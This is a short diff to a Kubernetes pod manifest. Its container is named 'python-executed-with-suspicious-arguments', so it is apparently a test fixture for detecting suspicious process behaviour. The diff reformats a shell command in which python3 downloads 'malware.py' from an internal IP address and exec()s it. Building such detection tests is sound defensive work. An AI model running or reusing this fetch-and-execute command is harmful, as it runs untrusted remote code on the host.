@@ -7,6 +7,5 @@ spec:
   - name: python-executed-with-suspicious-arguments
     image: angelrita/base-ubuntu:latest
     #imagePullPolicy: Never
-    command: ["sh"]
-    args: ["-c", "python3 -c 'import urllib.request; exec(urllib.request.urlopen(\"\
-        http://10.113.107.226:8000/malware.py\").read())'"]
+    command: ['sh']
+    args: ["-c", "python3 -c 'import urllib.request; exec(urllib.request.urlopen(\"http://10.113.107.226:8000/malware.py\").read())'"]
